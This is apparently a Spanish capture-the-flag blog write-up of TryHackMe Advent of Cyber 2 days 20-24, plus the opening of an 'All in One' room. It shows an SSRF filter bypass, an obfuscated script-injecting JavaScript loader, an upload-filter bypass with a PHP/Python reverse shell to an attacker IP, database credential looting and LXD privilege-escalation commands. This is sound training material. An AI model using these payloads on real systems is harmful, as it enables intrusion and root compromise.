Request Forgery (SSRF) y que al hacer bypass al filtro de hostname debemos utilizar localtest.me para que funcione. Al visitar la aplicacion vemos una caja de busqueda y tambien un formulario para ingresar credenciales.\nAl revisar el codigo fuente vemos que la caja de busqueda realiza la ejecucion de la funcion checkList().\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;div class=\u0026#34;col-lg-6 col-md-6 col-sm-12\u0026#34;\u0026gt; Welcome children!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; To find out if you are currently on the naughty list or the nice list, please enter your name below!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; Have a Merry Christmas! Ho ho ho!\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; - Santa\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;form onsubmit=\u0026#34;checkList(); return false\u0026#34;\u0026gt; Name: \u0026lt;input name=\u0026#34;name\u0026#34; id=\u0026#34;name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Search\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; function checkList() { window.location.replace(\u0026#34;/?proxy=\u0026#34; + encodeURIComponent(\u0026#34;http://list.hohoho:8080/search.php?name=\u0026#34; + encodeURIComponent(document.getElementById(\u0026#34;name\u0026#34;).value))); } \u0026lt;/script\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;/div\u0026gt; La funcion realiza la codificacion de la direccion http://list.hohoho:8080/search.php?name= a URI junto con la codificacion (URI) del valor ingresado en la cajita que tiene como id el valor name, al finalizar esta codificacion creada se pasa como valor del parametro proxy en la pagina principal, de tal forma que quedaria de la siguiente forma si el valor a buscar fuera santa.com:\n1 2 window.location.replace(\u0026#34;/?proxy=\u0026#34; + encodeURIComponent(\u0026#34;http://list.hohoho:8080/search.php?name=\u0026#34; + encodeURIComponent(document.getElementById(\u0026#34;name\u0026#34;).value))); // /?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dsanta.com Al realizar cualquier busqueda (ej. batman) este retorna el mensaje batman is on the Nice List., si se realiza una busqueda sin valor solo retorna is on the Nice List., dicha busqueda se pasa a una \u0026ldquo;pagina interna\u0026rdquo;: http://list.hohoho:8080 a la cual seguramente realiza una solicitud.\nSi enviamos el puerto incorrecto (ej. http%3A%2F%2Flist.hohoho%3A80%2Fsearch.php%3Fname%3Dbatman) este nos retorna el valor Failed to connect to list.hohoho port 80: Connection refused, si cambiamos el valor de la pagina list.hohoho a una IP retorna Your search has been blocked by our security team. lo que indica que la aplicacion verifica o filtra que el valor de \u0026ldquo;proxy\u0026rdquo; sea list.hohoho, de igual forma con algun otro dominio.\nComo sabemos la aplicacion es vulnerable a SSRF por lo que es posible realizar bypass al filtro de list.hohoho utilizando localtest.me agregando este ultimo a la direccion aceptada por la pagina: list.hohoho.localtest.me, existen otros valores que pueden ser reemplazados por localtest.me: lvh.me y vcap.me.\nAl realizar la solicitud a esta nueva direccion se muestra un nuevo mensaje en la pagina y contiene informacion para el panel que se encuentra en la pagina:\nAl ingresar con la contraseña y el usuario el cual tambien se define en el mensaje nos redirecciona a una nueva pagina, al pulsar el boton en esta nos muestra nuestra flag final.\nSSRF - POSTWIGGER DAY 20 - PowershELlF to the rescue El reto del dia incluye utilizar PowerShell y encontrar archivos y strings dentro de estos, la informacion en la descripcion del reto es suficiente para resolver las tareas. Para la primera tarea nos ubicamos en la direccion de Documents y realizamos la busqueda de un archivo oculto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\Users\\mceager\u0026gt; Set-Location Documents\\ PS C:\\Users\\mceager\\Documents\u0026gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 12/7/2020 10:29 AM 402 desktop.ini -arh-- 11/18/2020 5:05 PM 35 e1fone.txt PS C:\\Users\\mceager\\Documents\u0026gt; Get-Content e1fone.txt All I want is my \u0026#39;2 front teeth\u0026#39;!!! PS C:\\Users\\mceager\\Documents\u0026gt; Para la segunda tarea, realizamos de manera similar que la primera tarea pero en este caso buscamos un folder o directorio que especificamos con -Directory.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 PS C:\\Users\\mceager\u0026gt; Set-Location -Path Desktop\\ PS C:\\Users\\mceager\\Desktop\u0026gt; Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 12/7/2020 11:26 AM elf2wo PS C:\\Users\\mceager\\Desktop\u0026gt; Get-ChildItem -File -Path elf2wo\\ -ErrorAction SilentlyContinue Directory: C:\\Users\\mceager\\Desktop\\elf2wo Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/17/2020 10:26 AM 64 e70smsW10Y4k.txt PS C:\\Users\\mceager\\Desktop\u0026gt; Get-Content elf2wo\\e70smsW10Y4k.txt I want the movie Scrooged \u0026lt;3! PS C:\\Users\\mceager\\Desktop\u0026gt; Para la tercera tarea nos pide que realicemos la busqueda de un directorio oculto en C:\\Windows, como sabemos este directorio contiene un centenar de archivos por lo que al realizar la busqueda de la misma manera que en la segunda tarea nos retornaria una gran cantidad de directorios, si nos fijamos en los archivos y directorios que encontramos contienen un numero representado por el numero de tarea en este caso seria el numero 3 el cual utilizamos para filtrar los archivos que solo contengan este numero.\n1 2 3 4 5 6 7 8 9 PS C:\\Windows\u0026gt; Get-ChildItem -Directory -Recurse -Filter \u0026#39;*3*\u0026#39; -Hidden -ErrorAction SilentlyContinue Directory: C:\\Windows\\System32 Mode LastWriteTime Length Name ---- ------------- ------ ---- d--h-- 11/23/2020 3:26 PM 3lfthr3e En el directorio que encontramos obtenemos la lista de archivos ocultos y el numero de \u0026ldquo;palabras\u0026rdquo; que contiene el primero.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PS C:\\Windows\u0026gt; Set-Location System32\\3lfthr3e PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Directory: C:\\Windows\\System32\\3lfthr3e Mode LastWriteTime Length Name ---- ------------- ------ ---- -arh-- 11/17/2020 10:58 AM 85887 1.txt -arh-- 11/23/2020 3:26 PM 12061168 2.txt PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 1.txt | Measure-Object -Word Lines Words Characters Property ----- ----- ---------- -------- 9999 PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Obtenemos las palabras segun el index indicado (551 y 6991):\n1 2 3 4 5 PS C:\\Windows\\System32\\3lfthr3e\u0026gt; (Get-Content -Path 1.txt)[551] Red PS C:\\Windows\\System32\\3lfthr3e\u0026gt; (Get-Content -Path 1.txt)[6991] Ryder PS C:\\Windows\\System32\\3lfthr3e\u0026gt; En la ultima tarea debemos de buscar las dos palabras anteriores (Red Ryder) dentro del archivo 2.txt para ello utilizamos Select-String con -Pattern y con la ayuda de la pista dada.\n1 2 3 4 5 6 7 PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 2.txt | Select-String -pattern \u0026#34;Red Ryder\u0026#34; PS C:\\Windows\\System32\\3lfthr3e\u0026gt; Get-Content -Path 2.txt | Select-String -Pattern \u0026#34;redryder\u0026#34; redryderbbgun PS C:\\Windows\\System32\\3lfthr3e\u0026gt; DAY 21 - Time for some ELForensics En el reto del dia se presentan algunos ejecutables los cuales pueden ayudar a obtener informacion e identificar archivos, el objetivo es poder encontrar el conector de la base de datos oculto utilizando tecnicas forenses-investigativas.\n1: Debemos de obtener el hash MD5 del archivo db.exe en el archivo de texto en Documents\\. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\\Users\\littlehelper\\Documents\u0026gt; dir Directory: C:\\Users\\littlehelper\\Documents Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/23/2020 11:21 AM 63 db file hash.txt -a---- 11/23/2020 11:22 AM 5632 deebee.exe PS C:\\Users\\littlehelper\\Documents\u0026gt; gc \u0026#34;db file hash.txt\u0026#34; Filename: db.exe MD5 Hash: 596690FFC54AB6101932856E6A78E3A1 PS C:\\Users\\littlehelper\\Documents\u0026gt; 2: obtener el hash MD5 del archivo ejecutable en Documents\\.\nWhat is the file hash of the mysterious executable within the Documents folder? 1 2 3 4 5 6 7 8 PS C:\\Users\\littlehelper\\Documents\u0026gt; Get-FileHash -Algorithm MD5 deebee.exe Algorithm Hash Path --------- ---- ---- MD5 5F037501FB542AD2D9B06EB12AED09F0 C:\\Users\\littlehelper\\Documents\\deebee.exe PS C:\\Users\\littlehelper\\Documents\u0026gt; 3: Utilizando strings debemos de encontrar la flag dentro del ejecutable anterior. 1 2 3 4 5 6 PS C:\\Users\\littlehelper\\Documents\u0026gt; c:\\Tools\\strings64.exe -accepteula deebee.exe | Select-String -pattern \u0026#34;{\u0026#34; THM{f6187e6cb[... snip ...]3e108cb6f9} PS C:\\Users\\littlehelper\\Documents\u0026gt; 4: La flag que se muestra al ejecutar el archivo anterior. Al ejecutar vemos una flag que desaparece rapidamente. Verificamos los Alternate Data Streams que mencionan y vemos que existe un stream llamado hidedb. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 PS C:\\Users\\littlehelper\\Documents\u0026gt; Get-Item -Path deebee.exe -Stream * PSPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe::$DATA PSParentPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents PSChildName : deebee.exe::$DATA PSDrive : C PSProvider : Microsoft.PowerShell.Core\\FileSystem PSIsContainer : False FileName : C:\\Users\\littlehelper\\Documents\\deebee.exe Stream : :$DATA Length : 5632 PSPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents\\deebee.exe:hidedb PSParentPath : Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\littlehelper\\Documents PSChildName : deebee.exe:hidedb PSDrive : C PSProvider : Microsoft.PowerShell.Core\\FileSystem PSIsContainer : False FileName : C:\\Users\\littlehelper\\Documents\\deebee.exe Stream : hidedb Length : 6144 PS C:\\Users\\littlehelper\\Documents\u0026gt; Ejecutamos el archivo (stream) oculto y nos muestra la flag que necesitabamos.\nDAY 22 - Elf McEager becomes CyberElf En el reto del dia presentan una serie de retos que consiste en decodificar cadenas de texto utilizando la herramienta CyberChef.\n1: What is the password to the KeePass database?, encontramos una carpeta en el escritorio la cual tiene un nombre codificado en base64, utilizamos CyberChef para obtener decodificar el texto que es la contraseña de KeePass.\n2: What is the encoding method listed as the \u0026lsquo;Matching ops\u0026rsquo;?, en la categoria principal Private encontramos una contraseña la cual ya esta en texto plano, al revisar el historial vemos otra la cual parece estar codificada. Utilizando Magic de CyberChef vemos el tipo de codificacion (el segundo) el cual sugiere Magic podriamos utilizar.\n3: What is the decoded password value of the Elf Server?, en la categoria Networking encontramos una contraseña la cual esta codificada en Hexadecimal.\n4: What is the decoded password value for ElfMail?, en la categoria eMail encontramos la contraseña que esta codificada en HTML entities.\n5: Decode the last encoded value. What is the flag?, en la categoria Recycle Bin encontramos una contraseña en texto plano pero en la descripcion de esta encontramos codigo JavaScript que esta evaluando una cadena de caracteres en Unicode. Utilizamos From Charcode eliminando el codigo Javascript para obtener en texto plano lo que esta codificado, vemos que es codigo Javascript y dentro de este vemos tambien que hay caracteres Unicode.\nObtuvimos los valores reales de los valores unicode, lo que indica una URL y un \u0026ldquo;hash\u0026rdquo;(?), visitamos la URL con el \u0026ldquo;hash\u0026rdquo; y vemos nuestra flag.\nLa pista tambien nos indica que agreguemos dos veces From Charcode y nos devuelve: ............https://gist.github.com/heavenraiza/....................1d321244c4d667446dbfd9a3298a88b8...........\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var somestring = document.createElement(\u0026#39;script\u0026#39;); somestring.type = \u0026#39;text/javascript\u0026#39;; somestring.async = true; somestring.src = String.fromCharCode(104, 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 115, 116, 46, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 104, 101, 97, 118, 101, 110, 114, 97, 105, 122, 97, 47); //smestring.src = hhttps://gist.github.com/heavenraiza/ var alls = document.getElementsByTagName(\u0026#39;script\u0026#39;); var nt3 = true; for (var i = alls.length; i--;) { //11d321244c4d667446dbfd9a3298a88b8 if (alls[i].src.indexOf(String.fromCharCode(49, 49, 100, 51, 50, 49, 50, 52, 52, 99, 52, 100, 54, 54, 55, 52, 52, 54, 100, 98, 102, 100, 57, 97, 51, 50, 57, 56, 97, 56, 56, 98, 56)) \u0026gt; -1) { nt3 = false; } } if (nt3 == true) { document.getElementsByTagName(\u0026#39;head\u0026#39;)[0].appendChild(somestring); } DAY 23 - The Grinch strikes again! En la descripcion del dia realizan una explicacion sobre Ransomware, Volume Shadow Copy Service y Task Scheduler, y que este malware puede hacer uso de tareas programadas. Para las diferentes tareas se hace el uso de las herramientas VSS y Task Scheduler.\nDecrypt the fake \u0026lsquo;bitcoin address\u0026rsquo; within the ransom note. What is the plain text value?, en el escritorio encontramos una nota de \u0026ldquo;rescate\u0026rdquo; que esta \u0026ldquo;encriptada\u0026rdquo; pero es codificacion base64, la decodificamos y tenemos la \u0026ldquo;direccion\u0026rdquo; bitcoin. 1 2 3 4 5 #As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I\u0026#39;ll give you the key to decrypt. \u0026gt;:^p sckull@tars:~$ echo bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==|base64 -d nomorebestfestivalcompany sckull@tars:~$ At times ransomware changes the file extensions of the encrypted files. What is the file extension for each of the encrypted files?, en la carpeta Documents\\ y en la particion de Backup encontramos un archivo que parece estar encriptado y su extencion es .grinch.\nWhat is the name of the suspicious scheduled task?, en Scheduler Task encontramos una tarea que ejecuta un ejecutable con un nombre extraño.\nInspect the properties of the scheduled task. What is the location of the executable that is run at login?, la direccion del ejecutable.\nThere is another scheduled task that is related to VSS. What is the ShadowCopyVolume ID?, encontramos otra tarea que ejecuta el VSS con el nombre del ID de ShadowCopyVolume.\nAssign the hidden partition a letter. What is the name of the hidden folder?, en la particion de Backup activamos la opcion de mostrar archivos ocultos para ver la carpeta oculta.\nWhat is the password within the file?, en la carpeta que encontramos vemos Propiedades \u0026gt; Previous Version, abrimos la carpeta y archivo que contiene la contraseña.\nDAY 24 - The Trial Before Christmas El ultimo dia presentan una descripcion de Burpsuite, MySQL, Cracking y Privilege Escalation LXD y una maquina la cual hay que obtener las respuestas a las tareas.\nWhat ports are open?: Realizamos un escaneo de puertos donde encontramos el puerto 80 y 65000 abiertos. 1 2 3 4 5 6 7 8 9 10 # Nmap 7.80 scan initiated Thu Dec 24 17:56:29 2020 as: nmap -p- --min-rate 1000 -o scanPorts 10.10.88.80 Warning: 10.10.88.80 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.88.80 (10.10.88.80) Host is up (0.34s latency). Not shown: 63777 closed ports, 1756 filtered ports PORT STATE SERVICE 80/tcp open http 65000/tcp open unknown # Nmap done at Thu Dec 24 17:59:31 2020 -- 1 IP address (1 host up) scanned in 182.67 seconds What\u0026rsquo;s the title of the hidden website?: utilizamos wfuzz para realizar una busqueda de directorios/paginas recursiva, en la primera busqueda encontramos dos paginas, realizamos una segunda busqueda utilizando el directorio/pagina /3/ ya que /codes/ nos muestra solo un mensaje. Al finalizar encontramos una pagina en /3/9/9/2/3/6/4/ en el puerto 80. En el puerto 65000 encontramos un login con el titulo que buscamos. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #PUERTO 80 #wfuzz -c -w /usr/share/wordlists/dirb/big.txt --hc 404 http://10.10.88.80/3/9/9/2/3/6/4/ /codes/ /3/ #PUERTO 650000 kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.88.80:65000/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /api (Status: 301) /assets (Status: 301) /grid (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /uploads.php (Status: 200) What is the name of the hidden php page?, con el escaneo con gobuster en el puerto 65000 encontramos la pagina, donde es posible subir archivos.\nWhat is the name of the hidden directory where file uploads are saved?, segun el escaneo de gobuster encontramos el directorio/pagina /grid.\nBypass the filters. Upload and execute a reverse shell., intentamos subir una imagen en la pagina pero nos detecta que no es un tipo de archivo valido, analizando el codigo fuente vemos el codigo (filter.js, upload.js) donde se \u0026ldquo;filtran\u0026rdquo; los tipos de archivos png, jpeg, jpg pero al mismo tiempo estos tipos de archivos son los aceptados segun el codigo fuente de la pagina. Para hacer bypass utilizamos la configuracion de Burpusite descrita en el reto del dia, lo que ayudaria a que el filtro (filter.js) no \u0026ldquo;sea cargado\u0026rdquo; (opcion de Drop). Al realizar lo anterior si nos aceptaria los archivos y se mostrarían en /grid.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 //filter.js const filter = file =\u0026gt; { if([\u0026#34;image/png\u0026#34;, \u0026#34;image/jpeg\u0026#34;, \u0026#34;image/jpg\u0026#34;].indexOf(file.type) \u0026lt; 0){ return false; } else if ([\u0026#34;png\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;jpg\u0026#34;].indexOf(file.name.split(\u0026#34;.\u0026#34;).pop()) \u0026lt; 0){ return false; } //Let\u0026#39;s be honest -- these things are dangerous. May as well always return false Â¯\\_(ãƒ„)_/Â¯ return false; } //upload.js [... snip ... ] if(typeof filter === \u0026#34;function\u0026#34;){ if(!filter(file)){ changeMsg(\u0026#34;Invalid File Type\u0026#34;); return; } } [... snip ... ] Subimos una imagen: batman.jpg.\nCreamos un archivo que ejecute nuestra shell inversa con el nombre y codigo shell.jpg.php:\n1 2 3 4 \u0026lt;?php system(\u0026#34;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.2.29.162\\\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\u0026#34;); ?\u0026gt; What is the value of the web.txt flag?, con nuestra shell realizamos la busqueda del archivoweb.txt. 1 2 3 4 5 6 7 www-data@light-cycle:/var/www/TheGrid/public_html/grid$ find / -name web.txt 2\u0026gt;/dev/null \u0026lt;/public_html/grid$ find / -name web.txt 2\u0026gt;/dev/null /var/www/web.txt www-data@light-cycle:/var/www/TheGrid/public_html/grid$ cat /var/www/web.txt cat /var/www/web.txt THM{ENT[... snip ...]ID} www-data@light-cycle:/var/www/TheGrid/public_html/grid$ Upgrade and stabilize your shell., con nuestra shell y con la descripcion del reto actualizamos nuestra shell a una más comoda.\nReview the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password, realizamos una enumeracion de archivos de la pagina que encontramos y vemos las credenciales para la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php cat dbauth.php \u0026lt;?php $dbaddr = \u0026#34;localhost\u0026#34;; $dbuser = \u0026#34;t[... snip ...]on\u0026#34;; $dbpass = \u0026#34;IFight[... snip ...]Users\u0026#34;; $database = \u0026#34;tron\u0026#34;; $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database); if($dbh-\u0026gt;connect_error){ die($dbh-\u0026gt;connect_error); } ?\u0026gt; Access the database and discover the encrypted credentials. What is the name of the database you find these in?, utilizando las credenciales ingresamos a la base de datos donde vemos las credenciales encriptadas. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p [... snip ...] mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | tron | +--------------------+ 2 rows in set (0.09 sec) mysql\u0026gt; use tron; show tables; use tron; Database changed mysql\u0026gt; show tables; +----------------+ | Tables_in_tron | +----------------+ | users | +----------------+ 1 row in set (0.00 sec) mysql\u0026gt; select * from users; select * from users; +----+----------+----------------------------------+ | id | username | password | +----+----------+----------------------------------+ | 1 | flynn | edc628f6[... snip ...]683f5e3ff7 | +----+----------+----------------------------------+ 1 row in set (0.00 sec) mysql\u0026gt; Crack the password. What is it?, utilizando CrackStation obtenemos en texto plano el hash que encontramos en la base de datos.\nUse su to login to the newly discovered user by exploiting password reuse. - What is the value of the user.txt flag?, utilizamos la contraseña y usuario en la maquina para cambiar de usuario y obtener la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 www-data@light-cycle:/var/www/TheGrid/includes$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash [... snip ...] pollinate:x:111:1::/var/cache/pollinate:/bin/false flynn:x:1000:1000:flynn,,,:/home/flynn:/bin/bash www-data@light-cycle:/var/www/TheGrid/includes$ su flynn su flynn Password: @co[... snip ...]er@ flynn@light-cycle:/var/www/TheGrid/includes$ cd cd flynn@light-cycle:~$ ls -lah ls -lah total 32K drwxr-xr-x 4 flynn flynn 4.0K Dec 19 16:42 . drwxr-xr-x 3 root root 4.0K Dec 18 14:08 .. lrwxrwxrwx 1 root root 9 Dec 18 17:44 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 flynn flynn 220 Dec 18 14:08 .bash_logout -rw-r--r-- 1 flynn flynn 3.7K Dec 18 14:08 .bashrc drwx------ 2 flynn flynn 4.0K Dec 18 14:10 .cache drwx------ 3 flynn flynn 4.0K Dec 18 14:10 .gnupg -rw-r--r-- 1 flynn flynn 807 Dec 18 14:08 .profile -rw-r--r-- 1 flynn flynn 0 Dec 18 14:10 .sudo_as_admin_successful -r-------- 1 flynn flynn 30 Dec 19 16:42 user.txt flynn@light-cycle:~$ cat user.txt cat user.txt THM{IDEN[... snip ...]NISED} flynn@light-cycle:~$ Check the user\u0026rsquo;s groups. Which group can be leveraged to escalate privileges?, vemos los grupos a los que el usuario actual pertence. 1 2 3 4 5 6 7 flynn@light-cycle:~$ id id uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd) flynn@light-cycle:~$ groups groups flynn lxd flynn@light-cycle:~$ Abuse this group to escalate privileges to root., utilizamos la misma forma para escalar privilegios con lxd como en las maquinas de htb y thm. 1 2 3 4 5 6 7 8 9 10 11 12 13 #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #GAMINSERVER MACHINE lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage lxc image list lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh What is the value of the root.txt flag? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ~ # cd /mnt/root/root cd /mnt/root/root /mnt/root/root # ls -lah ls -lah total 32K drwx------ 4 root root 4.0K Dec 20 03:51 . drwxr-xr-x 23 root root 4.0K Dec 18 14:18 .. lrwxrwxrwx 1 root root 9 Dec 18 17:43 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.0K Apr 9 2018 .bashrc drwxr-x--- 3 root root 4.0K Dec 20 03:51 .config lrwxrwxrwx 1 root root 9 Dec 19 15:15 .mysql-history -\u0026gt; /dev/null -rw------- 1 root root 264 Dec 19 15:19 .mysql_history -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwx------ 2 root root 4.0K Dec 18 17:57 .ssh -r-------- 1 root root 600 Dec 19 20:18 root.txt /mnt/root/root # cat root.txt cat root.txt THM{FLY[... snip ...]ES} \u0026#34;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word \u0026#39;HOLO\u0026#39; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!\u0026#34; /mnt/root/root # ","description":"Advent of Cyber 2 de TryHackMe contiene una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.","id":82,"section":"posts","tags":["web","reversing","networking","scripting","python","blue",""],"title":"TryHackMe - Advent of Cyber 2","uri":"https://sckull.github.io/posts/aoc2020/"},{"content":"\rAll in One es una maquina de TryHackMe, una vulnerabilidad SQLi y LFI en WordPress nos permitio obtener credenciales las cuales utilizamos en el panel, seguidamente ejecutamos una shell inversa. Finalmente obtuvimos acceso root mediante bash y un script perteneciente a la lista de crontab.\nRoom Titulo All in One Descripción This is a fun box where you will get to exploit the system in several ways. Few intended and unintended paths to getting user and root access. Puntos 160 Dificultad Facil Maker i7md NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 # Nmap 7.80 scan initiated Thu Dec 10 13:59:17 2020 as: nmap -p- --min-rate 1000 -o allPorts allinone.thm Nmap scan report for allinone.thm (10.10.25.67) Host is up (0.29s latency). Not shown: 65025 closed ports, 507 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Thu Dec 10 14:01:50 2020 -- 1 IP address (1 host up) scanned in 152.79 seconds # Nmap 7.80 scan initiated Thu Dec 10 14:03:29 2020 as: nmap -p 21,22,80 -sV -sC -o servicePorts allinone.thm Nmap scan report for allinone.thm (10.10.25.67) Host is up (0.33s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.2.29.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA) | 256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA) |_ 256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Dec 10 14:03:47 2020 -- 1 IP address (1 host up) scanned in 17.51 seconds FTP El ingreso por medio de anonymous (anonymous:anonymous) esta permitido, por lo que utilizamos las \u0026ldquo;credenciales\u0026rdquo; en este servicio, pero no encontramos nada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 kali@kali:~/thm/allinone$ ftp allinone.thm Connected to allinone.thm. 220 (vsFTPd 3.0.3) Name (allinone.thm:kali): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; pwd 257 \u0026#34;/\u0026#34; is the current directory ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 115 4096 Oct 06 11:57 . drwxr-xr-x 2 0 115 4096 Oct 06 11:57 .. 226 Directory send OK. ftp\u0026gt; exit 221 Goodbye. HTTP Encontramos la pagina web de apache en el puerto 80.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, donde encontramos una direccion hacia una pagina en wordpress.\n1 2 3 4 5 kali@kali:~/thm/allinone$ gobuster dir -u http://allinone.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403) /wordpress (Status: 301) WPSCAN - WORDPRESS Utilizamos wpscan para poder obtener informacion sobre la version, plugins, temas y posibles usuarios en la pagina de wordpress. Vemos que la version de wordpress es 5.5.1 y dos plugins mail-masta 1.0 y reflex-gallery 3.1.7.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 [+] XML-RPC seems to be enabled: http://allinone.thm/wordpress/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - 